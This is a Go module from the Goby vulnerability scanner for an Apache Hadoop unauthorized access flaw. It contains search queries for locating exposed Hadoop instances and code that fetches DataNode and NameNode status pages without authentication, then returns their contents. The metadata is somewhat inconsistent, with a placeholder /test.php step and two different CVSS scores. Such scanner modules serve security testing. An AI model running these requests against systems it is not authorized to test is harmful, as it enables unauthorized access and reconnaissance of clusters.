package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Hadoop is a distributed system infrastructure developed by the Apache Foundation. Users can develop distributed programs without understanding the underlying details of distribution. Make full use of the power of clusters for high-speed computing and storage.</p><p>Attackers can access the /index.html directory without authentication. Attackers can operate data in multiple directories, such as deleting, downloading, directory browsing and even command execution, causing great harm.</p>",
    "Product": "Hadoop",
    "Homepage": "https://hadoop.apache.org/docs/current/hadoop-hdfs-httpfs/index.html",
    "DisclosureDate": "2017-09-30",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "title=\"Hadoop Administration\" || body=\"/static/hadoop.css\" || body=\"class=\\\"navbar-brand\\\">Hadoop</div>\" || title==\"Namenode information\" || body=\"<table class=\\\"table\\\" title=\\\"NameNode Journals\\\">\"",
    "Level": "1",
    "Impact": "<p>There is an unauthorized access vulnerability in Apache Hadoop. An attacker can access the /index.html directory without authentication. The attacker can operate data in multiple directories, such as deleting, downloading, directory browsing and even command execution, which will cause great harm. harm.</p>",
    "Recommendation": "<p>1. If unnecessary, close the Hadoop web management page</p><p>2. Enable authentication to prevent unauthorized users from accessing</p><p>3. Set up a \"security group\" access control policy to prohibit or restrict trusted IP addresses from accessing the public network through multiple default open ports of Hadoop</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "data",
            "show": ""
        }
    ],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2019-10-08 11:30:56",
    "fofacli_version": "3.10.4",
    "fofascan_version": "0.1.16",
    "status": "0",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "GobyQuery": "title=\"Hadoop Administration\" || body=\"/static/hadoop.css\" || body=\"class=\\\"navbar-brand\\\">Hadoop</div>\" || title==\"Namenode information\" || body=\"<table class=\\\"table\\\" title=\\\"NameNode Journals\\\">\"",
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "CVEIDs": [
        ""
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Hadoop index 未授权访问漏洞",
            "Product": "Hadoop",
            "Description": "<p>Hadoop 是一个由 Apache 基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p><p>攻击者无需认证即可访问 /index.html目录 ，攻击者可以操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>",
            "Recommendation": "<p>1、如无必要，关闭 Hadoop Web 管理页面</p><p>2、开启身份验证，防止未经授权用户访问</p><p>3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问</p>",
            "Impact": "<p>Apache Hadoop 存在未授权访问漏洞，攻击者无需认证即可访问 /index.html 目录 ，攻击者可以操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。<br><br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache Hadoop Index Unauthorized Access Vulnerability",
            "Product": "Hadoop",
            "Description": "<p>Hadoop is a distributed system infrastructure developed by the Apache Foundation. Users can develop distributed programs without understanding the underlying details of distribution. Make full use of the power of clusters for high-speed computing and storage.</p><p>Attackers can access the /index.html directory without authentication. Attackers can operate data in multiple directories, such as deleting, downloading, directory browsing and even command execution, causing great harm.</p>",
            "Recommendation": "<p>1. If unnecessary, close the Hadoop web management page</p><p>2. Enable authentication to prevent unauthorized users from accessing</p><p>3. Set up a \"security group\" access control policy to prohibit or restrict trusted IP addresses from accessing the public network through multiple default open ports of Hadoop</p>",
            "Impact": "<p>There is an unauthorized access vulnerability in Apache Hadoop. An attacker can access the /index.html directory without authentication. The attacker can operate data in multiple directories, such as deleting, downloading, directory browsing and even command execution, which will cause great harm. harm.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "Name": "Apache Hadoop Index Unauthorized Access Vulnerability",
    "PostTime": "2023-12-14",
    "Is0day": false,
    "CVSSScore": "9.0",
    "PocId": "10895"
}`

	checkIndex7G3vgtYFnbrR3 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewGetRequestConfig("/index.html")
		postRequestConfig.Header.Store("Upgrade-Insecure-Requests", "1")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}
	datanodeG3vgtYFnbrR3 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if check, err := checkIndex7G3vgtYFnbrR3(hostInfo); check == nil && err != nil {
			return nil, err
		} else if check != nil && check.StatusCode != 200 && !strings.Contains(check.Utf8Html, "Hadoop Administration") {
			return nil, errors.New("漏洞利用失败")
		}
		redirectConfig := httpclient.NewGetRequestConfig(uri)
		redirectConfig.VerifyTls = false
		redirectConfig.FollowRedirect = false
		redirectConfig.Header.Store("Upgrade-Insecure-Requests", "1")
		redirectConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/index.html")
		return httpclient.DoHttpRequest(hostInfo, redirectConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, path := range []string{"/dfshealth.html", "/datanode.html", "/status.html"} {
				resp, _ := datanodeG3vgtYFnbrR3(hostInfo, path)
				if resp != nil && resp.StatusCode == 200 && ((strings.Contains(resp.Utf8Html, "DataNode")) || (strings.Contains(resp.Utf8Html, "Hadoop") && strings.Contains(resp.Utf8Html, "Overview"))) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "data" {
				for _, path := range []string{"/datanode.html", "/dfshealth.html", "/status.html"} {
					resp, err := datanodeG3vgtYFnbrR3(expResult.HostInfo, path)
					if resp != nil && resp.StatusCode == 200 && ((strings.Contains(resp.Utf8Html, "DataNode")) || (strings.Contains(resp.Utf8Html, "Hadoop") && strings.Contains(resp.Utf8Html, "Overview"))) {
						expResult.Success = true
						expResult.Output = resp.Utf8Html
						break
					} else if resp == nil && err != nil {
						expResult.Output = err.Error()
						break
					} else {
						expResult.Output = "漏洞利用失败"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
